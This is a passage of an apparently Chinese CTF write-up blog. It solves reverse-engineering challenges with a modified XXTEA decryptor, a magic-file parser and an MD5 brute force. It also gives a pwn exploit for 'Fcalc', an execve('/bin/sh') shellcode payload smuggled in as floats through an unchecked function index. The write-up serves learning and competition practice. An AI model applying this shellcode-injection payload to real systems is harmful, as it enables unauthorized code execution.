class="hljs-title">check</span>(<span class="hljs-params">instr:<span class="hljs-built_in">str</span>,checklist:<span class="hljs-built_in">list</span></span>)-&gt;<span class="hljs-built_in">int</span>:</span></span><br><span class="line">    length=<span class="hljs-built_in">len</span>(instr)</span><br><span class="line">    <span class="hljs-keyword">if</span> length%<span class="hljs-number">8</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Incorrect format."</span>)</span><br><span class="line">        exit(<span class="hljs-number">1</span>)</span><br><span class="line">    c=chiper()</span><br><span class="line">    v = c.bytes2ints(instr.encode())</span><br><span class="line">    output=<span class="hljs-built_in">list</span>(c.e(<span class="hljs-built_in">len</span>(v),v))</span><br><span class="line">    i=<span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">while</span>(i&lt;<span class="hljs-built_in">len</span>(checklist)):</span><br><span class="line">        <span class="hljs-keyword">if</span> i&lt;<span class="hljs-built_in">len</span>(output) <span class="hljs-keyword">and</span> output[i]==checklist[i]:</span><br><span class="line">            i+=<span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">    <span class="hljs-keyword">if</span> i==<span class="hljs-built_in">len</span>(checklist):</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>    </span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:</span><br><span class="line">    ans=[<span class="hljs-number">1374278842</span>, <span class="hljs-number">2136006540</span>, <span class="hljs-number">4191056815</span>, <span class="hljs-number">3248881376</span>]</span><br><span class="line">    <span class="hljs-comment"># generateRes()</span></span><br><span class="line">    flag=<span class="hljs-built_in">input</span>(<span class="hljs-string">'Please input flag:'</span>)</span><br><span class="line">    res=check(flag,ans)</span><br><span class="line">    <span class="hljs-keyword">if</span> res:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Congratulations, you've got the flag!"</span>)</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Flag is *ctf{your_input}!"</span>)</span><br><span class="line">        exit(<span class="hljs-number">0</span>)</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">'Nope,try again!'</span>)</span><br></pre></td></tr></tbody></table></figure><p>魔改的xxtea，改了delta和MX，简单修改一下就可以，解密脚本如下：</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span>  </span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELTA 0x87654321 </span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MX (((z&gt;&gt;6^y<span class="hljs-meta-string">&lt;&lt;4) + (y&gt;</span>&gt;2^z&lt;&lt;5)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line">  </span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">btea</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> *v, <span class="hljs-keyword">int</span> n, <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> key[<span class="hljs-number">4</span>])</span>  </span></span><br><span class="line"><span class="hljs-function"></span>{  </span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> y, z, sum;  </span><br><span class="line">    <span class="hljs-keyword">unsigned</span> p, rounds, e;  </span><br><span class="line">    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)            <span class="hljs-comment">/* Coding Part */</span>  </span><br><span class="line">    {  </span><br><span class="line">        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span>/n;  </span><br><span class="line">        sum = <span class="hljs-number">0</span>;  </span><br><span class="line">        z = v[n<span class="hljs-number">-1</span>];  </span><br><span class="line">        <span class="hljs-keyword">do</span>  </span><br><span class="line">        {  </span><br><span class="line">            sum += DELTA;  </span><br><span class="line">            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;  </span><br><span class="line">            <span class="hljs-keyword">for</span> (p=<span class="hljs-number">0</span>; p&lt;n<span class="hljs-number">-1</span>; p++)  </span><br><span class="line">            {  </span><br><span class="line">                y = v[p+<span class="hljs-number">1</span>];  </span><br><span class="line">                z = v[p] += MX;  </span><br><span class="line">            }  </span><br><span class="line">            y = v[<span class="hljs-number">0</span>];  </span><br><span class="line">            z = v[n<span class="hljs-number">-1</span>] += MX;  </span><br><span class="line">        }  </span><br><span class="line">        <span class="hljs-keyword">while</span> (--rounds);  </span><br><span class="line">    }  </span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)      <span class="hljs-comment">/* Decoding Part */</span>  </span><br><span class="line">    {  </span><br><span class="line">        n = -n;  </span><br><span class="line">        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span>/n;  </span><br><span class="line">        sum = rounds*DELTA;  </span><br><span class="line">        y = v[<span class="hljs-number">0</span>];  </span><br><span class="line">        <span class="hljs-keyword">do</span>  </span><br><span class="line">        {  </span><br><span class="line">            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;  </span><br><span class="line">            <span class="hljs-keyword">for</span> (p=n<span class="hljs-number">-1</span>; p&gt;<span class="hljs-number">0</span>; p--)  </span><br><span class="line">            {  </span><br><span class="line">                z = v[p<span class="hljs-number">-1</span>];  </span><br><span class="line">                y = v[p] -= MX;  </span><br><span class="line">            }  </span><br><span class="line">            z = v[n<span class="hljs-number">-1</span>];  </span><br><span class="line">            y = v[<span class="hljs-number">0</span>] -= MX;  </span><br><span class="line">            sum -= DELTA;  </span><br><span class="line">        }  </span><br><span class="line">        <span class="hljs-keyword">while</span> (--rounds);  </span><br><span class="line">    }  </span><br><span class="line">}  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>  </span></span><br><span class="line"><span class="hljs-function"></span>{  </span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">4</span>]= {<span class="hljs-number">1374278842</span>, <span class="hljs-number">2136006540</span>, <span class="hljs-number">4191056815</span>, <span class="hljs-number">3248881376</span>};  </span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> k[<span class="hljs-number">4</span>]= {<span class="hljs-number">0x67452301</span>,<span class="hljs-number">0xefcdab89</span>,<span class="hljs-number">0x98badcfe</span>,<span class="hljs-number">0x10325476</span>};  </span><br><span class="line">    <span class="hljs-keyword">int</span> n= <span class="hljs-number">4</span>;</span><br><span class="line">    btea(v, -n, k);  </span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%08x, %08x, %08x, %08x\n"</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>],v[<span class="hljs-number">2</span>],v[<span class="hljs-number">3</span>]);  </span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  </span><br><span class="line">}  </span><br></pre></td></tr></tbody></table></figure><h2 id="flagfile"><a href="#flagfile" class="headerlink" title="flagfile"></a>flagfile</h2><p>挺有意思的一道题目，用magic file对flag进行检验，正确有输出。尝试写一些magic file编译之后和给出的flag.mgc进行对比，大致可以看出每一行实际执行的功能。总的来说除了格式上flag{*}的匹配以外，只有两种运算</p><figure class="highlight x86asm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="hljs-number">0x40</span> leshort^<span class="hljs-number">0xA</span> =<span class="hljs-number">0xB</span></span><br><span class="line">&gt;(<span class="hljs-number">0x40.</span>b) <span class="hljs-built_in">byte</span>^<span class="hljs-number">0xA</span> =<span class="hljs-number">0xB</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>第一种表示对0x40位置的偏移进行计算，由此可以得到0x40-0x7E位置上的值。第二种是相对偏移，取出0x40位置上的一个byte，这个byte的值就是文件偏移，然后对该偏移处的byte进行计算。</p><p>计算都是异或，非常好还原，解析给出的flag.mgc然后计算得到flag</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">s=[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"./flag.mgc"</span>,<span class="hljs-string">"rb"</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">    mgc=f.read()</span><br><span class="line"></span><br><span class="line">p1=mgc[<span class="hljs-number">0x2F0</span>:<span class="hljs-number">0x31F0</span>]</span><br><span class="line">idx=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p1),<span class="hljs-number">0x178</span>):</span><br><span class="line">    tmp=p1[i:i+<span class="hljs-number">0x178</span>]</span><br><span class="line">    <span class="hljs-comment"># print(hex(tmp[0x18]),hex(tmp[0x20]))</span></span><br><span class="line">    s[idx]=tmp[<span class="hljs-number">0x18</span>]^tmp[<span class="hljs-number">0x20</span>]</span><br><span class="line">    idx+=<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">p2=mgc[<span class="hljs-number">0x31f0</span>:<span class="hljs-number">0x60F0</span>]</span><br><span class="line">flag=[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>)]</span><br><span class="line">idx=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p2),<span class="hljs-number">0x178</span>):</span><br><span class="line">    tmp=p2[i:i+<span class="hljs-number">0x178</span>]</span><br><span class="line">    <span class="hljs-comment"># print(hex(tmp[0x18]),hex(tmp[0x20]))</span></span><br><span class="line">    flag[s[idx]]=tmp[<span class="hljs-number">0x18</span>]^tmp[<span class="hljs-number">0x20</span>]</span><br><span class="line">    idx+=<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">""</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag]))</span><br></pre></td></tr></tbody></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Fcalc"><a href="#Fcalc" class="headerlink" title="Fcalc"></a>Fcalc</h2><p>浮点数计算器，要求输入的所有数据都是1.0-100.0之间的浮点数，可以使用+-*/四种运算，但是在判断时对调用函数的索引没有进行严格限制，导致可以通过输入0执行shellcode。此外，还有一个buf overflow，可以覆盖已经读入内存的浮点数值。</p><p>最大的难点在于shellcode必须满足1.0-100.0之间的浮点数这一要求，构造起来难度很大，所以使了个讨巧的办法，对一个浮点数，替换头两位为jmp $-x，跳转到不需要检查的输入执行，这种替换不太会影响浮点数的值，只会在小数点后几位产生影响。</p><p>payload如下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="hljs-string">"1.1 1.2"</span>)</span><br><span class="line">s(<span class="hljs-string">b"0"</span> + <span class="hljs-string">b" "</span> * <span class="hljs-number">0x1F</span> + execve_bin_sh.ljust(<span class="hljs-number">0x20</span>, <span class="hljs-string">b"\x90"</span>) + p64(<span class="hljs-number">0x3FF199999999CEEB</span>) * <span class="hljs-number">3</span>)</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hws-2023</title>
      <link href="/2023/07/18/hws-2023/"/>
      <url>/2023/07/18/hws-2023/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>没有时间参加线下的夏令营，所以没花太多时间，只是简单做了几道题</p><span id="more"></span><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Animals"><a href="#Animals" class="headerlink" title="Animals"></a>Animals</h2><p>输入9个数字，有6个选项，选中的选项就把对应的字符串拼接到后面，然后算一个魔改的md5，最主要的改动就是替换了这4个值</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5_starts</span><span class="hljs-params">(md5_context *ctx)</span> </span>{</span><br><span class="line">  ctx-&gt;total[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  ctx-&gt;total[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">0</span>] = <span class="hljs-number">0xEFCDAB89</span>;</span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">1</span>] = <span class="hljs-number">0x67452301</span>;</span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">2</span>] = <span class="hljs-number">0x10325476</span>;</span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">3</span>] = <span class="hljs-number">0x98BADCFE</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>总共也就只有6^9种可能，直接爆破得到输入<code>051410233</code>，算md5即可</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> res[<span class="hljs-number">18</span>] = {</span><br><span class="line">    <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x83</span>,</span><br><span class="line">    <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x0E</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> total[<span class="hljs-number">2</span>];   <span class="hljs-comment">/*!&lt; number of bytes processed  */</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> state[<span class="hljs-number">4</span>];   <span class="hljs-comment">/*!&lt; intermediate digest state  */</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">64</span>]; <span class="hljs-comment">/*!&lt; data block being processed */</span></span><br><span class="line">} md5_context;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> {</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * \brief          MD5 context setup</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * \param ctx      context to be initialized</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5_starts</span><span class="hljs-params">(md5_context *ctx)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * \brief          MD5 process buffer</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * \param ctx      MD5 context</span></span><br><span class="line"><span class="hljs-comment"> * \param input    buffer holding the  data</span></span><br><span class="line"><span class="hljs-comment"> * \param ilen     length of the input data</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5_update</span><span class="hljs-params">(md5_context *ctx, <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *input, <span class="hljs-keyword">int</span> ilen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * \brief          MD5 final digest</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * \param ctx      MD5 context</span></span><br><span class="line"><span class="hljs-comment"> * \param output   MD5 checksum result</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5_finish</span><span class="hljs-params">(md5_context *ctx, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> output[<span class="hljs-number">16</span>])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * \brief          Output = MD5( input buffer )</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * \param input    buffer holding the  data</span></span><br><span class="line"><span class="hljs-comment"> * \param ilen     length of the input data</span></span><br><span class="line"><span class="hljs-comment"> * \param output   MD5 checksum result</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *input, <span class="hljs-keyword">int</span> ilen, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> output[<span class="hljs-number">16</span>])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * 32-bit integer manipulation macros (little endian)</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> GET_ULONG_LE</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_ULONG_LE(n, b, i)                                                  \</span></span><br><span class="line"><span class="hljs-meta">  {                                                                            \</span></span><br><span class="line"><span class="hljs-meta">    (n) = ((unsigned long)(b)[(i)]) | ((unsigned long)(b)[(i) + 1] &lt;&lt; 8) |     \</span></span><br><span class="line"><span class="hljs-meta">          ((unsigned long)(b)[(i) + 2] &lt;&lt; 16) |                                \</span></span><br><span class="line"><span class="hljs-meta">          ((unsigned long)(b)[(i) + 3] &lt;&lt; 24);                                 \</span></span><br><span class="line"><span 